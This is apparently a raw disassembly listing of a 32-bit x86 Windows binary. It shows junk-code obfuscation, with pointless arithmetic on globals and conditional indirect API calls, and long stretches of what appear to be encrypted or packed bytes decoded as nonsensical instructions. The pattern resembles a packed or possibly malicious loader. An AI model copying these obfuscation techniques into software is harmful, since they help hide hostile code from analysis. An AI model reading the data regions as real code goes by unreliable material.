  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428461
  401886:	sbb    DWORD PTR ds:0x42840d,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428569,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428479,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x42854d
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x428339,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428569,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428165
  4018d1:	push   0x4281f1
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x428451,0x428471
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428465,edx
  4018fa:	sub    DWORD PTR ds:0x42846d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x428419,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x428415
  401914:	mov    edx,DWORD PTR ds:0x4284f1
  40191a:	movzx  edx,WORD PTR ds:0x428579
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428565,0x405c
  401930:	cmp    DWORD PTR ds:0x428419,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428365
  401961:	adc    DWORD PTR ds:0x428561,ecx
  401967:	sub    DWORD PTR ds:0x428365,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428475,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x42844d
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x428555,edi
  401997:	mov    DWORD PTR ds:0x428439,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428475,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x428243
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x428341,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x428441
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x4284dd,0x428569
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx-0x386f51d]
  401a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a07:	mov    esi,0xbdbebecc
  401a0c:	les    edi,FWORD PTR [esi-0x4c77d842]
  401a12:	xchg   ebx,eax
  401a13:	popa   
  401a14:	imul   edi,DWORD PTR [ebx-0x57fa3798],0xd13d6bff
  401a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a1f:	mov    bl,0x97
  401a21:	push   es
  401a22:	dec    esp
  401a23:	mov    esp,0xe4b39999
  401a28:	ins    BYTE PTR es:[edi],dx
  401a29:	adc    ebx,DWORD PTR [ebx]
  401a2b:	jnp    0x401a46
  401a2d:	sbb    BYTE PTR [edi+ebx*1+0x2a07949f],ah
  401a34:	fsubr  DWORD PTR [edi-0x51]
  401a37:	xor    ebx,DWORD PTR [ebp-0x5]
  401a3a:	shl    DWORD PTR [ecx+0x8191100],1
  401a40:	xchg   esi,eax
  401a41:	sti    
  401a42:	jbe    0x401a24
  401a44:	pushf  
  401a45:	mov    al,ds:0x9e9ce834
  401a4a:	add    DWORD PTR [eax-0x455b2b9e],esi
  401a50:	mov    bl,0x57
  401a52:	push   es
  401a53:	in     eax,dx
  401a54:	into   
  401a55:	fcom   st(1)
  401a57:	sub    DWORD PTR ds:0x621463bb,ebx
  401a5d:	out    dx,eax
  401a5e:	or     eax,0x8b0bc1d3
  401a63:	lods   al,BYTE PTR ds:[esi]
  401a64:	outs   dx,BYTE PTR ds:[esi]
  401a65:	or     BYTE PTR [edi-0x18],ah
  401a68:	push   esi
  401a69:	out    dx,al
  401a6a:	fdiv   st,st(4)
  401a6c:	mov    edi,0xf1685bf3
  401a71:	pop    ebx
  401a72:	adc    BYTE PTR [edx],al
  401a74:	lods   eax,DWORD PTR ds:[esi]
  401a75:	mul    BYTE PTR [ecx-0x59]
  401a78:	push   0xffffffdf
  401a7a:	pusha  
  401a7b:	jge    0x401a26
  401a7d:	push   cs
  401a7e:	or     ebx,DWORD PTR [ecx]
  401a80:	dec    esp
  401a81:	add    edx,ecx
  401a83:	mov    ebx,0x45fd828
  401a88:	call   0x2ab0:0x9585f3d8
  401a8f:	xlat   BYTE PTR ds:[ebx]
  401a90:	cmp    al,0xdd
  401a92:	and    BYTE PTR [edx],0x6a
  401a95:	push   edi
  401a96:	js     0x401b0e
  401a98:	iret   
  401a99:	lea    eax,[ecx-0x64]
  401a9c:	jno    0x401a81
  401a9e:	bound  edi,QWORD PTR [edx-0x39]
  401aa1:	or     edi,esi
  401aa3:	adc    bh,al
  401aa5:	aam    0xa0
  401aa7:	(bad)  cs:[ebp-0x39]
  401aab:	test   BYTE PTR [ebx-0x1a],dh
  401aae:	push   es
  401aaf:	imul   esi,DWORD PTR [eax+0x53d7c10],0xa943373b
  401ab9:	or     eax,0xd825772c
  401abe:	pop    eax
  401abf:	inc    esi
  401ac0:	fcom   QWORD PTR ds:0xc6cb1355
  401ac6:	sar    DWORD PTR [ecx-0x44],0xa
  401aca:	shl    BYTE PTR [edx-0x61],cl
  401acd:	vmwrite esi,DWORD PTR [edx-0x46589923]
  401ad4:	outs   dx,DWORD PTR ds:[esi]
  401ad5:	test   eax,0xefcac721
  401ada:	stc    
  401adb:	into   
  401adc:	fisttp WORD PTR [edi]
  401ade:	pop    es
  401adf:	mov    edi,0x92fcafc9
  401ae4:	and    ebp,edi
  401ae6:	pop    ds
  401ae7:	mov    eax,DWORD PTR [ebx-0x1d0aba36]
  401aed:	cmp    eax,0x4edd6079
  401af2:	inc    edx
  401af3:	mov    ds:0xc8e6b088,al
  401af8:	jle    0x401a9b
  401afa:	pop    es
  401afb:	loope  0x401af8
  401afd:	loop   0x401a97
  401aff:	and    esi,DWORD PTR [edx]
  401b01:	mov    ebp,0x5f70e1e1
  401b06:	pop    edi
  401b07:	mov    esp,0xae1a3fe1
  401b0c:	push   eax
  401b0d:	sub    al,0xa2
  401b0f:	xchg   esi,eax
  401b10:	sub    eax,0x38bbac20
  401b15:	and    edx,DWORD PTR [esi-0x7991ea87]
  401b1b:	push   esp
  401b1c:	sbb    BYTE PTR [edx+0x6299034a],bl
  401b22:	int    0x7f
  401b24:	xor    al,0x58
  401b26:	push   edi
  401b27:	cmp    cl,BYTE PTR ds:0xe42e74e
  401b2d:	into   
  401b2e:	mov    esp,DWORD PTR [ecx+ebx*4]
  401b31:	add    eax,0xeb41d59f
  401b36:	mov    ecx,0xc99651d6
  401b3b:	in     al,0xa9
  401b3d:	outs   dx,DWORD PTR ds:[esi]
  401b3e:	pop    ss
  401b3f:	call   0x2311:0xe21b294e
  401b46:	push   ss
  401b47:	shl    ah,1
  401b49:	lea    ebp,[esp+ebp*4-0x67]
  401b4d:	lea    eax,[ebx+0x6f]
  401b50:	ror    eax,0x9f
  401b53:	or     eax,0x65fa11b8
  401b58:	xor    ah,0xbe
  401b5b:	cs mov esi,0x7a8a6f6c
  401b61:	test   DWORD PTR [eax+0x68],edx
  401b64:	and    BYTE PTR [ecx+0x1d33255a],0x32
  401b6b:	push   es
  401b6c:	out    dx,al
  401b6d:	js     0x401b4b
  401b6f:	sar    DWORD PTR [edi],1
  401b71:	hlt    
  401b72:	inc    ebx
  401b73:	fild   DWORD PTR [ecx-0x42]
  401b76:	test   eax,0x42d5a577
  401b7b:	push   ebx
  401b7c:	dec    eax
  401b7d:	mov    esi,0x48ef087e
  401b82:	mov    esp,0x83f905fd
  401b87:	adc    BYTE PTR [edi-0x3c13c328],0xcd
  401b8e:	repnz xchg ecx,eax
  401b90:	and    BYTE PTR [ebx+edx*1],cl
  401b93:	cmp    eax,eax
  401b95:	stos   BYTE PTR es:[edi],al
  401b96:	scas   eax,DWORD PTR es:[edi]
  401b97:	xor    al,0x54
  401b99:	pop    esp
  401b9a:	in     eax,0x92
  401b9c:	and    eax,0x51cadd0b
  401ba1:	add    DWORD PTR [eax],0xc944c0a8
  401ba7:	mov    DWORD PTR [edi+0x58],ecx
  401baa:	pop    ebp
  401bab:	sahf   
  401bac:	inc    ebx
  401bad:	mov    cl,0xac
  401baf:	add    esp,DWORD PTR [ecx+eax*2]
  401bb2:	repz or eax,0x4416a303
  401bb8:	pop    ecx
  401bb9:	mov    ecx,eax
  401bbb:	lahf   
  401bbc:	push   0xa895b18e
  401bc1:	div    BYTE PTR [esi+esi*1+0x50b2319b]
  401bc8:	ds clc 
  401bca:	mov    ebp,0x2250f3f6
  401bcf:	hlt    
  401bd0:	js     0x401c48
  401bd2:	dec    ebx
  401bd3:	inc    edi
  401bd4:	dec    ebp
  401bd5:	pop    ecx
  401bd6:	scas   eax,DWORD PTR es:[edi]
  401bd7:	mov    esi,0x4166da48
  401bdc:	ffree  st(2)
  401bde:	int    0x5
  401be0:	shr    DWORD PTR [edi],0xf7
  401be3:	repnz pusha 
  401be5:	mov    edi,0x60e82cfb
  401bea:	mov    edi,0xfbc893ab
  401bef:	lods   al,BYTE PTR ds:[esi]
  401bf0:	xor    BYTE PTR [edi+edx*1-0x45c4daea],0xad
  401bf8:	sbb    BYTE PTR [ebp-0x1f],0x59
  401bfc:	pop    ecx
  401bfd:	xlat   BYTE PTR ds:[ebx]
  401bfe:	iret   
  401bff:	mov    edi,0x701309b
  401c04:	push   ds
  401c05:	dec    ecx
  401c06:	cdq    
  401c07:	or     DWORD PTR [ebx-0x51],ecx
  401c0a:	mov    al,ds:0x62a89b54
  401c0f:	shl    BYTE PTR [edx],cl
  401c11:	test   edi,eax
  401c13:	int    0x4f
  401c15:	fwait
  401c16:	add    bh,BYTE PTR [ecx+0x65]
  401c19:	inc    eax
  401c1a:	(bad)  
  401c1b:	imul   esi,DWORD PTR [ebx],0x9760f930
  401c21:	sahf   
  401c22:	in     eax,dx
  401c23:	nop
  401c24:	sahf   
  401c25:	sbb    edx,esi
  401c27:	push   ebp
  401c28:	loopne 0x401c48
  401c2a:	test   BYTE PTR [edx+0x3214365b],dh
  401c30:	jl     0x401c42
  401c32:	pushf  
  401c33:	test   BYTE PTR [ecx],bh
  401c35:	scas   al,BYTE PTR es:[edi]
  401c36:	aas    
  401c37:	neg    DWORD PTR [eax-0x2744a297]
  401c3d:	cmp    eax,DWORD PTR [esp+eiz*8-0x6fe1b6bd]
  401c44:	aaa    
  401c45:	mov    ch,0xad
  401c47:	stc    
  401c48:	and    eax,0x8143da8e
  401c4d:	xchg   esi,eax
  401c4e:	out    dx,eax
  401c4f:	mov    al,0xb6
  401c51:	xor    dl,ah
  401c53:	adc    eax,0x122643c2
  401c58:	pop    ds
  401c59:	inc    edi
  401c5a:	iret   
  401c5b:	fs pop ss
  401c5d:	xchg   ecx,eax
  401c5e:	dec    esp
  401c5f:	(bad)  
  401c61:	iret   
  401c62:	adc    al,dl
  401c64:	jg     0x401cbd
  401c66:	das    
  401c67:	sar    BYTE PTR [esi+edx*8],0x18
  401c6b:	ficomp DWORD PTR [edi-0x2c]
  401c6e:	je     0x401c0d
  401c70:	lock xor edx,DWORD PTR [edi-0x24ca8f6f]
  401c77:	sub    DWORD PTR [ebx+esi*1],edi
  401c7a:	mov    esi,0xcee5e61d
  401c7f:	xor    ebp,esi
  401c81:	jnp    0x401c2e
  401c83:	les    ecx,FWORD PTR [edi]
  401c85:	(bad)  
  401c87:	sub    eax,0xe94ba091
  401c8c:	aaa    
  401c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c8e:	pop    ebx
  401c8f:	mov    ds:0x2ea39c22,eax
  401c94:	(bad)  
  401c95:	popf   
  401c96:	fidivr DWORD PTR [eax]
  401c98:	pop    ds
  401c99:	stos   BYTE PTR es:[edi],al
  401c9a:	mov    esi,0xf91ac5c6
  401c9f:	adc    eax,DWORD PTR [ebp+0x613b59a6]
  401ca5:	out    0x49,eax
  401ca7:	adc    esp,DWORD PTR [edi+edx*2]
  401caa:	mov    edx,DWORD PTR [ecx+eax*8+0x77af9e53]
  401cb1:	retf   0x2d64
  401cb4:	out    dx,al
  401cb5:	mov    bh,0x10
  401cb7:	jae    0x401ce3
  401cb9:	mov    al,ds:0xb5be064a
  401cbe:	in     eax,0x86
  401cc0:	out    dx,al
  401cc1:	(bad)  
  401cc2:	push   ss
  401cc3:	inc    eax
  401cc4:	std    
  401cc5:	fnstenv [edx-0x1fe74b56]
  401ccb:	or     DWORD PTR [edx-0x74850b8b],ecx
  401cd1:	dec    BYTE PTR [edi]
  401cd3:	retf   0x5ad5
  401cd6:	out    0x3f,al
  401cd8:	sbb    DWORD PTR [edi-0x70],ebx
  401cdb:	pop    edi
  401cdc:	add    bx,WORD PTR es:[eax-0x35b9e8e4]
  401ce4:	adc    esi,ecx
  401ce6:	cmp    BYTE PTR [edx+0x66],bl
  401ce9:	retf   0x43fa
  401cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ced:	repnz or eax,0x4f28e123
  401cf3:	cmc    
  401cf4:	fld    DWORD PTR gs:[ecx+0x30f4fb69]
  401cfb:	iret   
  401cfc:	jg     0x401c84
  401cfe:	paddusw mm4,QWORD PTR [eax]
  401d01:	frstor [esi-0x1e0b9cde]
  401d07:	adc    DWORD PTR ds:[ebx+0x5284a859],ebx
  401d0e:	fcomp  QWORD PTR [edx+0x1f]
  401d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d12:	out    0x71,al
  401d14:	jl     0x401c99
  401d16:	pop    eax
  401d17:	mov    edi,0x6093cad0
  401d1c:	and    bh,BYTE PTR [esi]
  401d1e:	or     esp,DWORD PTR [eax]
  401d20:	and    ecx,DWORD PTR [ecx-0x3de87164]
  401d26:	sbb    edi,DWORD PTR [ecx-0x380aed55]
  401d2c:	jo     0xc173eb19
  401d32:	and    BYTE PTR [edx],dl
  401d34:	imul   edi,eax,0xdd5ea2d1
  401d3a:	mov    dl,0x1a
  401d3c:	sub    eax,0x694b595d
  401d41:	cmp    BYTE PTR [ecx],ch
  401d43:	outs   dx,DWORD PTR ds:[esi]
  401d44:	jmp    0x5fc6:0xdfc1459f
  401d4b:	ror    DWORD PTR [eax-0x6c],1
  401d4e:	xlat   BYTE PTR ds:[ebx]
  401d4f:	push   ebx
  401d50:	repz mov ebx,0x9f21c3d1
  401d56:	xor    DWORD PTR [ebx-0x585c67e3],ebx
  401d5c:	push   0xfffffff1
  401d5e:	(bad)  
  401d5f:	shl    BYTE PTR ds:0xcddbe314,0xf
  401d66:	imul   DWORD PTR [edx+0x33]
  401d69:	daa    
  401d6a:	jmp    0x33b2:0x993c53fc
  401d71:	mov    BYTE PTR [ecx+0x66],bl
  401d74:	or     eax,0x5a5adc0f
  401d79:	shl    BYTE PTR [ecx+edi*4+0x6f],0xf6
  401d7e:	adc    eax,0xa9e43030
  401d83:	popf   
  401d84:	jge    0x401d35
  401d86:	rcl    BYTE PTR [edx-0x40],0x34
  401d8a:	dec    edi
  401d8b:	inc    eax
  401d8c:	popf   
  401d8d:	fs push ecx
  401d8f:	adc    dl,BYTE PTR [eax]
  401d91:	mov    ebp,0x9045c7a4
  401d96:	push   ebp
  401d97:	sub    al,0x0
  401d99:	add    bh,al
  401d9b:	inc    ebp
  401d9c:	xchg   esp,eax
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	inc    ebp
  401d9f:	add    BYTE PTR [eax],al
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x428425,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x42855d,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x42840d
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428371,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x42834d
  401dfc:	and    DWORD PTR ds:0x428575,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x428415,0x0
  401e17:	mov    DWORD PTR ds:0x42854d,0x646
  401e21:	mov    DWORD PTR ds:0x428425,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x4284f1
  401e37:	mov    DWORD PTR ds:0x428415,ebx
  401e3d:	cmp    DWORD PTR ds:0x428415,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x428243
  401e52:	push   0x428147
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x42854d,0x4536
  401e6c:	sub    DWORD PTR ds:0x4284d5,edi
  401e72:	sbb    DWORD PTR ds:0x42843d,0x42854d
  401e7c:	add    DWORD PTR ds:0x428465,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428575,0x428425
  401e90:	adc    DWORD PTR ds:0x428569,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x428559,0x428545
  401ea4:	add    DWORD PTR ds:0x428345,0x5dac
  401eae:	add    DWORD PTR ds:0x42833d,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x428431,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x42854d,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x4284c5
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x428359
  401f03:	or     eax,DWORD PTR ds:0x428435
  401f09:	mov    ds:0x428359,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x42855d,0x0
  401f1c:	mov    DWORD PTR ds:0x428335,0xd43
  401f26:	mov    DWORD PTR ds:0x428579,0x5a6d
  401f30:	mov    DWORD PTR ds:0x42841d,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428475,edx
  401f46:	cmp    DWORD PTR ds:0x42855d,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x428238
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x428445,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x4284f1,0xfa0
  401f82:	adc    DWORD PTR ds:0x428451,0x42833d
  401f8c:	add    DWORD PTR ds:0x428359,0x428471
  401f96:	cmp    DWORD PTR ds:0x42854d,0x0
  401f9d:	mov    DWORD PTR ds:0x428475,0x6252
  401fa7:	mov    DWORD PTR ds:0x428371,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x428555,edx
  401fbc:	cmp    DWORD PTR ds:0x42854d,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428165
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x42835d,0x4284f9
  401fde:	sbb    DWORD PTR ds:0x428439,0x5068
  401fe8:	xor    DWORD PTR ds:0x4284f1,edi
  401fee:	and    DWORD PTR ds:0x4284e1,0x42857d
  401ff8:	xor    DWORD PTR ds:0x4284f9,0x428575
  402002:	add    DWORD PTR ds:0x428545,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x428355,0x4284cd
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x4284d5,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x4284fd,0x428349
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x428501,0x4284dd
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428361,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	lods   al,BYTE PTR ds:[esi]
  40206e:	jmp    0x402084
  402070:	sahf   
  402071:	mov    ebp,0xbdbebed2
  402076:	les    edi,FWORD PTR [esi+0xe3e9fbe]
  40207c:	mov    edi,DWORD PTR [ebp-0x6b]
  40207f:	ret    0xd981
  402082:	test   BYTE PTR [esi+edx*2],0xf
  402086:	clc    
  402087:	cmp    edi,edx
  402089:	clc    
  40208a:	stos   BYTE PTR es:[edi],al
  40208b:	lock loop 0x402070
  40208e:	add    bl,BYTE PTR [edx-0x70ba8dbc]
  402094:	jl     0x40208d
  402096:	add    ecx,ebp
  402098:	repnz add edx,DWORD PTR fs:[eax+0x6b05287c]
  4020a0:	(bad)  
  4020a1:	std    
  4020a2:	shr    BYTE PTR [ecx-0x648a4f37],1
  4020a8:	out    0xf6,al
  4020aa:	adc    BYTE PTR [ebx],bh
  4020ac:	cdq    
  4020ad:	scas   eax,DWORD PTR es:[edi]
  4020ae:	retf   0x590f
  4020b1:	addr16 out 0xd8,al
  4020b4:	std    
  4020b5:	scas   al,BYTE PTR es:[edi]
  4020b6:	mov    ah,0xf9
  4020b8:	sbb    DWORD PTR [esi+0x76],esi
  4020bb:	pop    ds
  4020bc:	dec    edx
  4020bd:	inc    eax
  4020be:	lahf   
  4020bf:	adc    ecx,edi
  4020c1:	inc    esp
  4020c2:	mov    ch,0xec
  4020c4:	inc    edx
  4020c5:	xchg   edi,eax
  4020c6:	push   0x203535d
  4020cb:	adc    edi,DWORD PTR [esi+ebx*1+0x5988a106]
  4020d2:	dec    ebx
  4020d3:	int3   
  4020d4:	aad    0x9d
  4020d6:	sbb    al,0x1d
  4020d8:	cdq    
  4020d9:	pop    esi
  4020da:	push   eax
  4020db:	push   ecx
  4020dc:	jmp    0x402095
  4020de:	dec    ebx
  4020df:	outs   dx,DWORD PTR ds:[esi]
  4020e0:	(bad)  
  4020e1:	xchg   ebx,eax
  4020e2:	mov    dl,0x1d
  4020e4:	sahf   
  4020e5:	mov    ebp,0xd4d9f7d
  4020ea:	jb     0x402163
  4020ec:	in     eax,0x79
  4020ee:	ret    
  4020ef:	sub    DWORD PTR [ebp+0x38],eax
  4020f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020f3:	fdiv   st,st(3)
  4020f5:	enter  0x5b33,0x84
  4020f9:	add    eax,0xc1842c11
  4020fe:	push   edi
  4020ff:	mov    ah,0xfe
  402101:	sti    
  402102:	inc    ebp
  402103:	call   0xf4938c07
  402108:	test   bl,bh
  40210a:	dec    ecx
  40210b:	test   ebx,eax
  40210d:	push   0xffffff99
  40210f:	push   ebx
  402110:	push   ebx
  402111:	jns    0x402190
  402113:	add    esp,DWORD PTR [edx]
  402115:	dec    edi
  402116:	jb     0x40215b
  402118:	cmp    BYTE PTR [edx+edx*1+0x11],ah
  40211c:	add    eax,0x6d2a10
  402121:	xlat   BYTE PTR ds:[ebx]
  402122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402123:	sbb    ecx,eax
  402125:	test   BYTE PTR [ebx-0x1b810c86],cl
  40212b:	in     al,dx
  40212c:	jb     0x402196
  40212e:	into   
  40212f:	int    0x6c
  402131:	and    ebp,DWORD PTR [ecx+0x6a75d760]
  402137:	(bad)  
  402138:	pop    eax
  402139:	fmul   DWORD PTR [eax+edi*4-0x43ac158]
  402140:	push   edi
  402141:	push   ecx
  402142:	fimul  DWORD PTR [esp+ebx*8-0x6ae99cf6]
  402149:	sbb    bh,BYTE PTR [ebp+0x661c3f52]
  40214f:	mov    ebp,0x4211f16f
  402154:	cdq    
  402155:	jne    0x4020ec
  402157:	out    0x7b,al
  402159:	push   ebx
  40215a:	lea    esp,[esi]
  40215c:	(bad)  
  40215d:	xor    al,0x8a
  40215f:	pop    edx
  402160:	sbb    BYTE PTR [ebx+0x73e5d8dc],bl
  402166:	adc    ah,BYTE PTR [ebx]
  402168:	sub    al,0xed
  40216a:	fbstp  TBYTE PTR [ecx-0x43]
  40216d:	jle    0x402101
  40216f:	sub    dh,ah
  402171:	jmp    0x40214c
  402173:	jbe    0x402183
  402175:	outs   dx,BYTE PTR ds:[esi]
  402176:	fsubr  DWORD PTR [ebx-0x2cf11f52]
  40217c:	retf   
  40217d:	loopne 0x402115
  40217f:	leave  
  402180:	mov    BYTE PTR [edx-0x2e],ah
  402183:	pusha  
  402184:	ins    BYTE PTR es:[edi],dx
  402185:	test   eax,0x221fdbd
  40218a:	cmp    DWORD PTR [eax-0x50],edi
  40218d:	mov    esi,0x382be161
  402192:	xor    cl,dl
  402194:	add    eax,0x6cf4420b
  402199:	inc    ecx
  40219a:	out    dx,al
  40219b:	and    ecx,edi
  40219d:	sbb    DWORD PTR [edx-0x45],edx
  4021a0:	mov    esp,0x2a5db8f5
  4021a5:	out    dx,al
  4021a6:	and    al,0xc8
  4021a8:	or     bl,BYTE PTR [edi]
  4021aa:	jmp    0x783d:0xc389429
  4021b1:	jo     0x40220f
  4021b3:	fnstcw WORD PTR [esi]
  4021b5:	shr    ebp,cl
  4021b7:	mov    dl,0xfc
  4021b9:	pop    edi
  4021ba:	sbb    esp,ecx
  4021bc:	repz push 0x547cadf5
  4021c2:	fsub   QWORD PTR [eax+0xb]
  4021c5:	sbb    bl,BYTE PTR [esp+ebx*2-0x2199e72d]
  4021cc:	int3   
  4021cd:	ret    0xe4c9
  4021d0:	jg     0x4021f2
  4021d2:	pop    es
  4021d3:	or     ebx,DWORD PTR [ebx-0x7]
  4021d6:	push   ecx
  4021d7:	jmp    0x153c:0xd65414a3
  4021de:	(bad)  
  4021df:	push   ebp
  4021e0:	adc    dh,BYTE PTR [edi-0x2c69ea1e]
  4021e6:	enter  0xac64,0xc2
  4021ea:	jle    0x4021c5
  4021ec:	ret    0xc311
  4021ef:	xchg   ecx,eax
  4021f0:	push   ss
  4021f1:	add    al,0xab
  4021f3:	xchg   BYTE PTR [ebx-0x58372081],bh
  4021f9:	push   ebx
  4021fa:	daa    
  4021fb:	jns    0x4021f5
  4021fd:	je     0x4021c6
  4021ff:	out    0x2b,eax
  402201:	mov    dh,0x25
  402203:	dec    esi
  402204:	push   0xfc5bfd80
  402209:	cmp    ch,al
  40220b:	fimul  WORD PTR [ebx+0x59]
  40220e:	mov    BYTE PTR [edi],ch
  402210:	cs das 
  402212:	or     edi,ebp
  402214:	xor    al,0xa5
  402216:	(bad)  [esi-0x6d3d30e5]
  40221c:	jnp    0x402247
  40221e:	add    dh,BYTE PTR [edx+0x218f297]
  402224:	sub    eax,0x9770d8d2
  402229:	inc    eax
  40222a:	or     BYTE PTR [edi],ah
  40222c:	ins    BYTE PTR es:[edi],dx
  40222d:	int    0x7e
  40222f:	inc    ebx
  402230:	rcr    DWORD PTR [ecx-0x31],1
  402233:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402236:	arpl   di,ax
  402238:	fiadd  WORD PTR [ecx]
  40223a:	sub    al,0x18
  40223c:	add    DWORD PTR [esi+ebx*2-0xaa743c2],ebx
  402243:	mov    DWORD PTR [eax+0x3],eax
  402246:	mov    ecx,0x7c1eb868
  40224b:	cmp    ah,bl
  40224d:	or     esp,edx
  40224f:	add    esi,esi
  402251:	adc    BYTE PTR [esi-0x68c29967],ah
  402257:	(bad)  
  402259:	push   es
  40225a:	push   edx
  40225b:	js     0x402231
  40225d:	mov    ebp,DWORD PTR [esi]
  40225f:	fistp  WORD PTR [edi-0x5a451ce9]
  402265:	call   0x4a54:0x39568511
  40226c:	cmp    BYTE PTR [eax+0x20],al
  40226f:	or     DWORD PTR [ebx+ecx*1-0x263dc784],0x2096323
  40227a:	and    al,0x16
